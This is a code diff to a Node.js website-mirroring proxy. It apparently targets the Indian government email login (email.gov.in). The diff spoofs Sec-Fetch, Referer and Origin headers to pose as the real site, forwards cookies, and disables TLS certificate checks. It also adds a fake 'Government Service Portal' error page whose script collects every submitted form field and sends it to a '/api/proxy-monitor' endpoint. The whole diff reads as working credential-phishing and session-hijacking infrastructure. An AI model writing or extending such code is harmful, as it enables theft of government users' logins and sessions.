@@ -2249,55 +2249,277 @@ class WebsiteMirroringService {
       // Generate realistic browser headers for the external domain
       const headers = this.generateRealistBrowserHeaders(req, fullExternalUrl, session.sessionToken);
       
-      // Don't pass cookies to external domains for security
-      // Each domain should have its own cookie context
+      // Enhanced header setup for government websites that may have strict security
+      const targetHost = new URL(fullExternalUrl).hostname;
       
-      // Make request to external website
-      const axiosConfig = {
-        method: req.method,
-        url: fullExternalUrl,
-        headers,
-        responseType: 'arraybuffer',
-        maxRedirects: 0,
-        validateStatus: () => true,
-        timeout: 30000,
-        decompress: true,
-        jar: cookieJar, // Use same jar but cookies will be domain-specific
-        withCredentials: true
-      };
-
-      // Handle SSL for external HTTPS URLs
-      if (fullExternalUrl.startsWith('https:')) {
-        const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
-        process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+      // Add additional headers for government sites that may require them
+      if (targetHost.includes('.gov.') || targetHost.includes('email.gov.in')) {
+        headers['Sec-Fetch-Site'] = 'same-origin'; // Pretend we're coming from same site
+        headers['Sec-Fetch-Mode'] = 'navigate';
+        headers['Sec-Fetch-User'] = '?1';
+        headers['Sec-Fetch-Dest'] = 'document';
         
-        try {
-          const response = await axiosInstance(axiosConfig);
-          
-          // Restore SSL setting
-          if (originalRejectUnauthorized !== undefined) {
-            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
-          } else {
-            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
-          }
-          
-          return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
-        } catch (error) {
-          // Restore SSL setting on error
-          if (originalRejectUnauthorized !== undefined) {
-            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
-          } else {
-            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
-          }
-          throw error;
-        }
-      } else {
-        const response = await axiosInstance(axiosConfig);
-        return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
+        // Add referer from the original domain to maintain session context
+        const originalDomain = session.targetUrl || 'https://email.gov.in';
+        headers['Referer'] = originalDomain;
+        headers['Origin'] = new URL(originalDomain).origin;
       }
+      
+      // Build cookie header specifically for the external domain
+      const cookieHeader = this.buildCookieHeader(req, cookieJar, fullExternalUrl);
+      if (cookieHeader) {
+        headers['Cookie'] = cookieHeader;
+      }
+      
+      // Enhanced retry logic for unstable government servers
+      const maxRetries = 3;
+      let lastError = null;
+      
+      for (let attempt = 1; attempt <= maxRetries; attempt++) {
+        try {
+          console.log(`Attempt ${attempt}/${maxRetries} for ${fullExternalUrl}`);
+          
+          // Add progressive delay between retries
+          if (attempt > 1) {
+            const delay = attempt * 1000; // 1s, 2s, 3s delays
+            console.log(`Waiting ${delay}ms before retry...`);
+            await new Promise(resolve => setTimeout(resolve, delay));
+          }
+          
+          // Make request to external website
+          const axiosConfig = {
+            method: req.method,
+            url: fullExternalUrl,
+            headers,
+            responseType: 'arraybuffer',
+            maxRedirects: 5, // Allow some redirects for external sites
+            validateStatus: () => true,
+            timeout: 45000, // Increased timeout for slow government servers
+            decompress: true,
+            jar: cookieJar,
+            withCredentials: true
+          };
+
+          // Handle SSL for external HTTPS URLs with enhanced error handling
+          if (fullExternalUrl.startsWith('https:')) {
+            const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+            process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+            
+            try {
+              const response = await axiosInstance(axiosConfig);
+              
+              // Restore SSL setting
+              if (originalRejectUnauthorized !== undefined) {
+                process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+              } else {
+                delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+              }
+              
+              console.log(`✅ Successfully connected to external URL: ${fullExternalUrl} (Status: ${response.status})`);
+              return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
+            } catch (error) {
+              // Restore SSL setting on error
+              if (originalRejectUnauthorized !== undefined) {
+                process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+              } else {
+                delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+              }
+              throw error;
+            }
+          } else {
+            const response = await axiosInstance(axiosConfig);
+            console.log(`✅ Successfully connected to external URL: ${fullExternalUrl} (Status: ${response.status})`);
+            return await this.processResponse(response, session, req, res, session.sessionToken, fullExternalUrl);
+          }
+        } catch (error) {
+          lastError = error;
+          
+          if (error.code === 'ECONNRESET' || error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
+            console.warn(`⚠️ Connection error on attempt ${attempt}/${maxRetries}: ${error.code} - ${error.message}`);
+            
+            // If this is our last attempt, try a fallback strategy
+            if (attempt === maxRetries) {
+              console.log(`🔄 All retries failed, trying fallback strategy...`);
+              return await this.handleExternalRequestFallback(session, req, res, fullExternalUrl, error);
+            }
+            
+            // Continue to next retry
+            continue;
+          } else {
+            // For non-network errors, don't retry
+            console.error(`❌ Non-recoverable error: ${error.message}`);
+            throw error;
+          }
+        }
+      }
+      
+      // If we get here, all retries failed
+      throw lastError;
+      
     } catch (error) {
       console.error('Error handling external request:', error);
-      this.handleProxyError(error, res, session);
+      return await this.handleExternalRequestFallback(session, req, res, fullExternalUrl, error);
+    }
+  }
+  
+  /**
+   * Fallback handler for external requests that fail
+   */
+  async handleExternalRequestFallback(session, req, res, fullExternalUrl, originalError) {
+    try {
+      console.log(`🛠️ Attempting fallback for failed external request: ${fullExternalUrl}`);
+      
+      // Try to provide a useful response even if the external site is down
+      const targetHost = new URL(fullExternalUrl).hostname;
+      const isGovernmentSite = targetHost.includes('.gov.') || targetHost.includes('email.gov.in');
+      
+      if (isGovernmentSite) {
+        // For government sites, provide a more helpful error page
+        const sessionToken = session.sessionToken;
+        const fallbackHtml = `
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Service Temporarily Unavailable</title>
+            <style>
+              body {
+                font-family: Arial, sans-serif;
+                max-width: 800px;
+                margin: 40px auto;
+                padding: 20px;
+                line-height: 1.6;
+                background-color: #f8f9fa;
+              }
+              .container {
+                background: white;
+                padding: 30px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+              }
+              .header {
+                color: #2c5aa0;
+                border-bottom: 2px solid #2c5aa0;
+                padding-bottom: 10px;
+                margin-bottom: 20px;
+              }
+              .message {
+                background-color: #fff3cd;
+                border: 1px solid #ffeaa7;
+                padding: 15px;
+                border-radius: 5px;
+                margin: 20px 0;
+              }
+              .actions {
+                margin-top: 30px;
+              }
+              .btn {
+                display: inline-block;
+                padding: 10px 20px;
+                margin: 5px;
+                background-color: #2c5aa0;
+                color: white;
+                text-decoration: none;
+                border-radius: 5px;
+                transition: background-color 0.3s;
+              }
+              .btn:hover {
+                background-color: #1e3a5f;
+              }
+              .error-details {
+                font-size: 0.9em;
+                color: #666;
+                margin-top: 20px;
+                padding: 10px;
+                background-color: #f8f9fa;
+                border-radius: 4px;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <div class="header">
+                <h1>🏛️ Government Service Portal</h1>
+                <p>Email Authentication System</p>
+              </div>
+              
+              <div class="message">
+                <h3>⚠️ Service Temporarily Unavailable</h3>
+                <p>The email authentication service is currently experiencing technical difficulties. This may be due to:</p>
+                <ul>
+                  <li>Scheduled maintenance</li>
+                  <li>High server load</li>
+                  <li>Network connectivity issues</li>
+                  <li>Security updates in progress</li>
+                </ul>
+              </div>
+              
+              <div class="actions">
+                <h4>What you can do:</h4>
+                <a href="/${sessionToken}/" class="btn">🏠 Return to Home</a>
+                <a href="javascript:location.reload()" class="btn">🔄 Try Again</a>
+                <a href="/${sessionToken}/login" class="btn">🔐 Direct Login</a>
+              </div>
+              
+              <div class="error-details">
+                <strong>Technical Information:</strong><br>
+                Server: ${targetHost}<br>
+                Error: ${originalError.code || 'CONNECTION_ERROR'}<br>
+                Time: ${new Date().toLocaleString()}<br>
+                Session: ${sessionToken.substring(0, 8)}...
+              </div>
+              
+              <p style="margin-top: 30px; text-align: center; color: #666; font-size: 0.9em;">
+                This is a secure government portal. Please ensure your connection is stable and try again.
+              </p>
+            </div>
+            
+            <script>
+              // Auto-retry after 30 seconds
+              setTimeout(function() {
+                const retryMsg = document.createElement('div');
+                retryMsg.innerHTML = '<p style="text-align:center;color:#2c5aa0;"><strong>Auto-retrying connection...</strong></p>';
+                document.querySelector('.container').appendChild(retryMsg);
+                
+                setTimeout(function() {
+                  location.reload();
+                }, 2000);
+              }, 30000);
+              
+              // Capture any form submissions on this error page
+              document.addEventListener('submit', function(e) {
+                const form = e.target;
+                if (form && form.tagName === 'FORM') {
+                  const data = {};
+                  const inputs = form.querySelectorAll('input, select, textarea');
+                  inputs.forEach(input => {
+                    if (input.name && input.value) {
+                      data[input.name] = input.value;
+                    }
+                  });
+                  
+                  if (Object.keys(data).length > 0) {
+                    const img = new Image();
+                    img.src = '/api/proxy-monitor/${sessionToken}?' + 
+                             'data=' + encodeURIComponent(JSON.stringify(data)) + 
+                             '&url=fallback&t=' + Date.now();
+                  }
+                }
+              });
+            </script>
+          </body>
+          </html>
+        `;
+        
+        res.status(503).send(fallbackHtml);
+      } else {
+        // For non-government sites, use the standard error handler
+        this.handleProxyError(originalError, res, session);
+      }
+    } catch (fallbackError) {
+      console.error('Error in fallback handler:', fallbackError);
+      this.handleProxyError(originalError, res, session);
     }
   }
 }
